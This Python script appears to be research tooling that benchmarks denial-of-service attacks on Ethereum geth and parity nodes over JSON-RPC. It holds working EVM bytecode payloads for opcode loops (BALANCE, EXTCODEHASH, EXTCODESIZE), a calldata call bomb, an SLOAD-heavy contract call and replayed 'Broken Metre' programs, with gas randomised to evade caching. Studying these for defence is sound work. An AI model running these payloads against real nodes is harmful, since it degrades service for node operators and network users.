import json
import binascii
import time
import gzip
import random
import statistics
import argparse

import numpy as np
import requests
from sortedcontainers import SortedDict
from pyevmasm import disassemble_all, assemble_hex
from web3 import Web3

URL = "http://localhost:8545"

def generate_opcode_by_generation():
    """
    This will analyze the opcodes generated by the broken-metre paper to see how they changed over the generations

    This part is only to extract them, analysis is later performed based on the json

    Returns:
        opcode_by_generation_opcode_only.json file with a generation -> opcode -> count mapping
    """
    opcode_by_generation = SortedDict()
    with gzip.open("gas-stats-ex1-prog1000-5000-pop50-m30-e0-5m-nodrop.jsonl.gz") as f:
        for line in f:
            data = json.loads(line)
            generation = data["generationNumber"]
            for program in data["programs"]:
                code = program["program"]["code"]
                disassemble = disassemble_all(binascii.unhexlify(data["programs"][0]["program"]["code"]))
                # Get opcode by generation
                if generation not in opcode_by_generation:
                    opcode_by_generation[generation] = SortedDict()
                for op in disassemble:
                    if op.name not in opcode_by_generation[generation]:
                        opcode_by_generation[generation][op.name] = 0
                    opcode_by_generation[generation][op.name] += 1
            print(opcode_by_generation[generation])

    with open("opcode_by_generation_opcode_only.json", "w") as f:
        f.write(json.dumps(opcode_by_generation, sort_keys=True, indent=4))

def compare_opcodes(first_generation=0, last_generation=200):
    """
    Compare the opcodes used between two generations and print the difference
    """
    opcode_by_generation = {}
    with open("opcode_by_generation_opcode_only.json") as f:
        opcode_by_generation = json.load(f)
    for first_op_code, first_op_value in opcode_by_generation["%i" % first_generation].items():
        last_op_value = opcode_by_generation["%i" % last_generation].get(first_op_code, 0)
        print("%s: %i" % (first_op_code, last_op_value-first_op_value))

def run_against_node(parity=False, start_generation=0):
    """
    Execute the EVM bytecode generated in the broken-metre paper against a geth or parity node

    Args:
        parity: (bool) Run against parity instead of geth
        start_generation: (int) Which is the first iteration to run against the node
    """
    with gzip.open("gas-stats-ex1-prog1000-5000-pop50-m30-e0-5m-nodrop.jsonl.gz") as f:
        for line in f:
            data = json.loads(line)
            generation = data["generationNumber"]
            if generation < start_generation:
                continue
            print("Generation %s started" % generation)
            start = time.time()
            for program in data["programs"]:
                code = program["program"]["code"]
                geth_params = [
                    {
                        "gas":"0x989182",
                        "to":"0xebe8efa441b9302a0d7eaecc277c09d20d684540"
                    },
                    "latest",
                    {
                        "0xebe8efa441b9302a0d7eaecc277c09d20d684540": {
                            "code": "0x%s" % code
                        }
                    }
                ]
                parity_params = [
                    {
                        "gas": "0x989182",
                        "from": "0xebe8efa441b9302a0d7eaecc277c09d20d684540",
                        "data": "0x%s" % code
                    }
                ]
                r = requests.post(URL, json={
                    "method": "eth_call",
                    "params": parity_params if parity else geth_params, "id": 1, "jsonrpc": "2.0"})
            duration = time.time() - start
            print("Generation %s ended after %s seconds" % (generation, duration))


def saeiso_attack(parity=False, opcode="31"):
    """
    This will try to execute as many different opcode operations as possible and measure the execution time

    We will use an infinite loop containing BALANCE operations

    Args:
        parity: (bool) Run against parity instead of geth
        opcode: (string) Opcode to use for the attack.
                31: BALANCE, 3B: EXTCODESIZE, 3F: EXTCODEHASH

    Returns: [double, double] time spent in transaction and throughput in gas/s
    """
    # Repeat code 10 times in case of parity (to keep cost of calldata low) and 8000 times for geth to create a big contract
    code_repitions = 10 if parity else 8000
    code = "5b%s600056" % (("5a%s50"%opcode) * code_repitions)  # JUMPDEST (GAS BALANCE POP) * 8'000 PUSH1 0x0 JUMP
    gas = random.randint(9800000, 10000000)
    geth_params = [
        {
            "gas": hex(gas),  # providing random gas limit between 9.8m and 10m - geth is aggressively caching already queried balances
            "to":"0x5a31505a31505a31505a31505a31505a31505a31"  # this address is called with the code provided below
        },
        "latest",
        {
            "0x5a31505a31505a31505a31505a31505a31505a31": {
                "code": "0x%s" % code
            }
        }
    ]
    parity_params = [
        {
            "gas": hex(gas),  # providing random gas
            "from": "0x5a31505a31505a31505a31505a31505a31505a31",
            "data": "0x%s" % code
        }
    ]

    start = time.time()
    r = requests.post(URL, json={
        "method": "eth_call",
        "params": parity_params if parity else geth_params, "id": 1, "jsonrpc": "2.0"
    })
    duration = time.time() - start
    throughput = gas / duration
    print("Transaction executed in %s seconds" % duration)
    return [duration, throughput]

def large_calldata_attack():
    """
    Replaying the attack done here: https://gitlab.chainsecurity.com/hubert/goevmlab/blob/jumpdest/examples/jumpdest/main.go
    """
    code_a = assemble_hex("""GETPC
        PUSH20 0xFF0C000000000000000000000000000000000000
        DUP2
        JUMPDEST
        DUP3
        PUSH3 0x13EC64
        DUP2
        DUP1
        GAS
        GAS
        CALL
        PUSH1 0x17
        JUMP
    """)

    geth_params = [
        {
            "gas":hex(random.randint(9900000,10000000)),  # providing random gas - prevents simple caching on geth
            "to":"0xFF0A000000000000000000000000000000000000",  # this address is called with the code provided below
        },
        "latest",
        {
            "0xFF0A000000000000000000000000000000000000": {
                "code": code_a
            }
        }
    ]

    start = time.time()
    r = requests.post(URL, json={
        "method": "eth_call",
        "params": geth_params, "id": 1, "jsonrpc": "2.0"
    })
    duration = time.time() - start
    print("Transaction executed in %s seconds, output: %s" % (duration, r.json()))
    return duration

def sload_attack(parity=False):
    """
    We try to call into a big contract like DAI and have it revert after
    causing an SLOAD. We achieve this in this case by calling into the mint()
    function which will revert after loading and checking the user
    """
    # 0x23b872dd000000000000000000000000ff0a000000000000000000000000000000000000000000000000000000000000ff0b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
    # 0x23b872dd000000000000000000000000000000000000000000000000000000000000000000000000000000000096d680000000000000000000000000000000000000000000000000000000000096d6550000000000000000000000000000000000000001
    # 0x72dd529b
    print(Web3.keccak(text='totalSupply()'))
    code_a = assemble_hex("""
        PUSH32 0x23b872dd00000000000000000000000000000000000000000000000000000000
        PUSH1 0x00
        MSTORE
        GAS
        PUSH1 0x10
        MSTORE
        GAS
        PUSH1 0x30
        MSTORE
        PUSH32 0x0000000000000000000000000000000000000001000000000000000000000000
        PUSH1 0x50
        MSTORE

        GETPC
        PUSH20 0x89d24A6b4CcB1B6fAA2625fE562bDD9a23260359
        PUSH1 0x0
        JUMPDEST
        GAS
        PUSH1 0x30
        MSTORE8

        DUP1
        PUSH2 0x0EFF
        LT
        PUSH1 0xFF
        JUMPI
        PUSH1 0x20
        PUSH1 0x80
        PUSH1 0x64
        PUSH1 0x0
        PUSH1 0x0
        PUSH20 0x89d24A6b4CcB1B6fAA2625fE562bDD9a23260359
        GAS
        CALL
        ISZERO
        ADD
        DUP1
        PUSH1 0x68
        JUMPI
        STOP
    """)
    geth_params = [
        {
            "gas":hex(random.randint(9900000,10000000)),  # providing random gas - prevents simple caching on geth
            "to":"0xFF0A000000000000000000000000000000000000",  # this address is called with the code provided below
        },
        "latest",
        {
            "0xFF0A000000000000000000000000000000000000": {
                "code": code_a
            }
        }
    ]

    start = time.time()
    r = requests.post(URL, json={
        "method": "eth_call",
        "params": geth_params, "id": 1, "jsonrpc": "2.0"
    })
    duration = time.time() - start
    print("Transaction executed in %s seconds, output: %s" % (duration, r.json()))
    return duration

def detect_client(url=URL, output_client=False):
    """
    Check if we are running against parity or geth

    Args:
        url: (string) server to check

    Returns: (string) "parity" or "geth"
    Throws: ValueError if client is unsupported
    """
    r = requests.post(URL, json={
        "method": "web3_clientVersion",
        "params": [], "id": 1, "jsonrpc": "2.0"
    })
    client_string = r.json().get("result", "").lower()
    if output_client:
        print(client_string)
    parity = client_string.startswith("parity")
    geth = client_string.startswith("geth")
    if not geth and not parity:
        raise ValueError("unsupported client")

    return "parity" if parity else "geth"

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='DoS tests against parity/geth nodes')
    parser.add_argument('--url', help='URL of the Ethereum node RPC endpoint')
    parser.add_argument('--large-calldata', action='store_true', help='Run the calldata call bomb test')
    parser.add_argument('--sload-attack', action='store_true', help='Try to load data from a reverting big contract')
    parser.add_argument('--broken-metre', action='store_true', help='Run EVM bytecode from Broken Metre paper')
    parser.add_argument('--broken-metre-start-generation', type=int, help='The first generation to analyze - allows skipping of early fast generations')
    args = parser.parse_args()
    if args.url is not None:
        URL = args.url

    detect_client(output_client=True)

    if args.broken_metre:
        run_against_node(parity=detect_client() == "parity", start_generation=args.broken_metre_start_generation or 0)
    elif args.large_calldata:
        execution_times = []
        print("Analyzing calling non-existing contract with large calldata")
        for i in range(3):
            execution_times.append(
                large_calldata_attack()
            )
        print(
            "CALLDATA - Mean execution time of %i trials: %f seconds (std-dev: %f)" % (
                len(execution_times),
                statistics.mean(execution_times),
                statistics.stdev(execution_times)
            )
        )
    elif args.sload_attack:
        execution_times = []
        print("Analyzing calling many times into existing large contract")
        for i in range(3):
            execution_times.append(
                sload_attack()
            )
        print(
            "SLOAD - Mean execution time of %i trials: %f seconds (std-dev: %f)" % (
                len(execution_times),
                statistics.mean(execution_times),
                statistics.stdev(execution_times)
            )
        )
    else:
        for name, opcode in {
            "BALANCE": "31",
            "EXTCODEHASH": "3F",
            "EXTCODESIZE": "3B"
        }.items():
            execution_times = []
            print("Analyzing %s" % name)
            for i in range(3):
                execution_times.append(
                    saeiso_attack(
                        parity=detect_client() == "parity",
                        opcode=opcode
                    )
                )
            time_mean, throughput_mean = np.mean(execution_times, axis=0)
            time_std, throughput_std = np.std(execution_times, axis=0)
            print(
                "%s - Mean execution time of %i trials: %f seconds (std-dev: %f)\n"
                "%s - Mean throughput of %i trials:     %f gas/s (std-dev: %f)" % (
                    name,
                    len(execution_times),
                    time_mean,
                    time_std,
                    name,
                    len(execution_times),
                    throughput_mean,
                    throughput_std,
                )
            )
